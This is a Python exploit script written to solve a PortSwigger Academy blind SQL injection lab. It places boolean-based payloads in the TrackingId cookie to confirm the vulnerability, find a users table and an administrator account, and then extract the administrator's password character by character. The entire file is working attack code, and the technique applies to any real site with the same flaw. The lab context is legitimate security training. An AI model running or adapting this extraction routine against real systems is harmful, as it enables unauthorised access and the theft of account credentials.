#!/usr/bin/python3

import requests

PROLOGUE = '''The purpose of this exploit is to find the admin credentials
to solve the first Blind SQLi lab of the PortSwigger Academy.

Copyright (c) 2023 Carmelo Ballone a.k.a. Hackt4rus

'''

# Change the URL with the one you get when you access the lab
URL = "YOUR URL HERE"
MAX_PASSWD_LENGTH = 256
CHARS = 'abcdefghijklmnopqrstuvwxyz1234567890'
tracking_id = requests.get(URL).cookies['TrackingId']
session_id = requests.get(URL).cookies['session']


def is_vulnerable():
    global URL, tracking_id, session_id
    print("[*] Checking Blind SQLi vulnerability...")
    payload = f"{tracking_id}' AND 1='1"
    cookies = {"TrackingId": payload, "session": session_id}
    r = requests.get(URL, cookies=cookies)
    if "Welcome back!" in r.text:
        print("[*] True condition check: ok")
    else:
        print("[x] True condition check: fail")
        return False
    payload = f"{tracking_id}' AND 1='2"
    cookies['TrackingId'] = payload
    r = requests.get(URL, cookies=cookies)
    if "Welcome back!" not in r.text:
        print("[*] False contition check: ok")      
        print("[*] The application is vulnerable to Blind SQLi.\n")
        return True
    else:
         print("[x] False contition check: fail")      
    return False 
    

def users_table():
    global URL, tracking_id, session_id
    print("[*] Checking for 'users' table...")
    payload = f"{tracking_id}' AND (SELECT 'x' FROM users LIMIT 1)='x'--"
    cookies = {"TrackingId": payload, "session": session_id}
    r = requests.get(URL, cookies=cookies)
    if "Welcome back!" in r.text:
        print("[*] Found: 'users' table")
    else:
        print("[x] No 'users' table found\n")
        return False
    payload = f"{tracking_id}' AND (SELECT 'x' FROM hackt4rus LIMIT 1)='x'--"
    cookies['TrackingId'] = payload
    r = requests.get(URL, cookies=cookies)
    if "Welcome back!" not in r.text:
        print("[*] False condition check: ok\n")
        return True
    return False

def check_admin_user():
    global URL, tracking_id, session_id
    print("[*] Checking for 'administrator' user...")
    payload = f"{tracking_id}' AND (SELECT username FROM users WHERE username='administrator')='administrator'--"
    cookies = {"TrackingId": payload, "session": session_id}
    r = requests.get(URL, cookies=cookies)
    if "Welcome back!" in r.text:
        print("[*] Found: 'administrator' user\n")
        return True
    else:
        print("[x] No 'administrator' user found\n")
    return False

def password_length():
    global URL, tracking_id, session_id, MAX_PASSWD_LENGTH
    print("Probing password length...")
    for i in range(MAX_PASSWD_LENGTH+1):
        payload = f"{tracking_id}' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>{i})='administrator'--"
        cookies = {"TrackingId": payload, "session": session_id}
        r = requests.get(URL, cookies=cookies)
        if "Welcome back!" not in r.text:
            print("[*] Found: password length is", i, '\n')
            break
    return i

def probe_password():
    global URL, tracking_id, session_id, CHARS
    length = password_length()
    password = ""
    print("[*] Probing password...")
    for i in range(1, length+1):
        for char in CHARS:
            payload = f"{tracking_id}' AND (SELECT SUBSTRING(password, {i}, 1) FROM users WHERE username='administrator')='{char}'--"
            cookies = {"TrackingId": payload, "session": session_id}
            r = requests.get(URL, cookies=cookies)
            print(password, end="", flush=True)
            print(char, end="\r", flush=True)
            if "Welcome back!" in r.text:
                password += char
                break
    print(password, '\n')
    print(f"[*] Found credentials:    administrator:{password}") 

    
if __name__ == '__main__':
    print(PROLOGUE)
    if is_vulnerable():
        if users_table():
            if check_admin_user():
                probe_password()
        else:
            exit()
    else:
        print("This web application is not vulnerable to Blind SQLi.")
    exit()
